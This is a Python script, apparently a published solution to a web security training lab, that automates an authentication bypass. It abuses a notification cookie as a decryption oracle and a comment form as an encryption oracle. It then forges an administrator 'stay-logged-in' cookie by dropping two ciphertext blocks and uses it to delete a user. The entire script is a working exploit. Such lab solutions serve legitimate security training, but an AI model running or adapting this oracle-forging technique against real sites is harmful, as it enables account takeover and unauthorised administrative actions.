###############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 29/10/2023
#
# Lab: Authentication bypass via encryption oracle
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie to login
#        3. Login as wiener
#        4. Extract the stay-logged-in cookie
#        5. Fetch a post page with the stay-logged in cookie value in the notification 
#           cookie to decrypt it
#        6. Extract the decrypted value
#        7. Extract the csrf token to post a comment
#        8. Post a comment with <PADDING>administrator:<NUMBER> in the email field 
#           ( where PADDING is 9 bytes and and NUMBER is extracted from the decrypted value 
#           in the previous step )
#        9. Extract the notification cookie
#        10. Decode the notification cookie with base64
#        11. Remove the first two blocks and encode the remaining blocks
#        12. Place the last encoded value in the stay-logged-in cookie and delete carlos
#
###############################################################################################


###########
# imports
###########
import requests
from urllib.parse import (unquote, quote)
import re
from colorama import Fore
import base64

###########
# Main
###########

# change this to your lab URL
url = "https://0afe009304f4fad781ad5225001600e2.web-security-academy.net"

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "stay-logged-in": "on",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# get stay-logged-in cookie 
stay_logged_in = login.cookies.get("stay-logged-in")

print(Fore.WHITE + "⦗4⦘ Extracting the stay-logged-in cookie.. " + Fore.GREEN + "OK")

# set cookies
cookies = {
    "session": session,
    "notification": stay_logged_in 
}

try:  
    # fetch a post page with the stay-logged in cookie value in the notification cookie to decrypt it
    post_page = requests.get(f"{url}/post?postId=1", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch a post page through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Fetching a post page with the stay-logged in cookie value in the notification cookie to decrypt it.. " + Fore.GREEN + "OK")

# extract the decrypted value
decrypted = re.findall("\s*(wiener:\w*)\s*</header>", post_page.text)[0]

print(Fore.WHITE + "⦗6⦘ Extracting the decrypted value.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + decrypted)

# extract the csrf token needed for posting a comment
csrf = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

print(Fore.WHITE + "⦗7⦘ Extracting the csrf token needed for posting a comment.. " + Fore.GREEN + "OK")

# get the numbers part
numbers_part = decrypted.split(":")[1]

# concat the administrator with the numbers part and add 9 bytes padding
admin_numbers_padding = f"123456789administrator:{numbers_part}"

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "postId": "1",
    "comment": "not important",
    "name": "hacker",
    "email": admin_numbers_padding,
    "csrf": csrf,
}

try:  
    # post a comment
    post_comment = requests.post(f"{url}/post/comment", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to post a comment through exception")
    exit(1)

print(Fore.WHITE + "⦗8⦘ Posting a comment with " + Fore.YELLOW + admin_numbers_padding + Fore.WHITE + " in the email field.. " + Fore.GREEN + "OK")

# get the notification cookie
notification = post_comment.cookies.get("notification")

print(Fore.WHITE + "⦗9⦘ Extracting the notification cookie.. " + Fore.GREEN + "OK")

# URL decode the notification cookie
notification_url_decoded = unquote(notification)

# decode the cookie notifications with base64
decoded = base64.b64decode(notification_url_decoded)

print(Fore.WHITE + "⦗10⦘ Decoding the notification cookie with base64.. " + Fore.GREEN + "OK")

# remove the first two block
first_two_blocks_removed = list(bytes(decoded))[32:]

# encode the remain blocks with base64
encoded = base64.b64encode(bytes(first_two_blocks_removed)).decode()

print(Fore.WHITE + "⦗11⦘ Removing the first two blocks and encode the remaining blocks.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + encoded)

# set cookie
cookies = {
    "stay-logged-in": quote(encoded),
}

try:  
    # delete carlos
    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


